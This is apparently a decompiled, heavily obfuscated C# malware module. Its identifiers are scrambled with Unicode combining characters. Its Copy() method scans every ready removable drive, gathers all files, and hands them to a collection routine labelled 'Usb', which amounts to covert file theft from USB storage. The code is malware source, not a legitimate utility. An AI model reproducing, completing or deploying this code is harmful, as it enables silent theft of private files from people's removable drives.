using System;
using System.IO;

namespace \u030E\u0360\u0313\u034E\u0315\u0E47\u0020\u0305\u035C\u0351\u0E47\u0351\u0320\u0301\u036B\u0300zcryfxllszuahcty\u0347\u0334\u0342\u0E47\u0310\u032C\u0358\u0340\u036B\u0331\u0329\u036B\u0340\u032F\u0308\u0E47cexuwlosbhsreyjl
{
	// Token: 0x02000078 RID: 120
	internal static class Class_93
	{
		// Token: 0x06000220 RID: 544 RVA: 0x00011D38 File Offset: 0x0000FF38
		public static void Copy()
		{
			if (Class_84.\u034D\u0E47\u035A\u0320\u0345\u0346\u036C\u0E47\u0360\u0349\u0020\u035F\u0331\u034D\u036F\u033Bincnccdbjzxtctea\u0351\u032F\u0302\u0020\u030D\u0320\u036C\u0346\u036D\u0347\u034D\u0307\u0489\u0355\u033C\u033Dgpbgrconmginurco && Class_84.\u032C\u0E47\u0489\u036F\u0E47\u0302\u0313\u0349\u0350\u0E47\u0E47\u0316\u0E47\u032E\u035F\u030Amaodzqqqmkexevnq\u0323\u031F\u0347\u0306\u0020\u030C\u0332\u032F\u0355\u0363\u030C\u033D\u0354\u0324\u032F\u0344xygyjfcukmrwafsc)
			{
				foreach (DriveInfo driveInfo in DriveInfo.GetDrives())
				{
					if (driveInfo.IsReady && driveInfo.DriveType == DriveType.Removable)
					{
						Class_5.field_5.AddRange(Class_47.GetFilesDoc(driveInfo.RootDirectory.ToString(), "*.*"));
						if (!Class_58.tmethod_162(Class_47.\u035F\u0334\u0361\u0342\u0349\u0332\u0317\u033F\u0332\u0304\u0353\u0369\u0331\u0020\u036F\u032Favwbjaawjhovchqj\u035B\u0020\u0308\u0020\u0317\u0339\u0368\u0020\u034E\u0355\u0366\u032F\u0355\u0489\u036C\u0363ukaxxbymjidqsigk))
						{
							Class_58.gmethod_163(Class_47.\u035F\u0334\u0361\u0342\u0349\u0332\u0317\u033F\u0332\u0304\u0353\u0369\u0331\u0020\u036F\u032Favwbjaawjhovchqj\u035B\u0020\u0308\u0020\u0317\u0339\u0368\u0020\u034E\u0355\u0366\u032F\u0355\u0489\u036C\u0363ukaxxbymjidqsigk);
						}
						Class_5.dmethod_6(Class_5.field_5, Class_5.field_9, Class_5.field_8, Class_5.field_10, "Usb", Class_84.\u0325\u0312\u0345\u0317\u0317\u033F\u0364\u0020\u036D\u036B\u0020\u0308\u034E\u033C\u032F\u034Abkevbflwouikidoj\u0358\u0302\u0E47\u0020\u0309\u0354\u0368i\u0E47\u0302\u0339\u035E\u0020\u032C\u0358\u0E47qoxjowjkszltpxxq, "USB\\");
					}
				}
			}
		}
	}
}
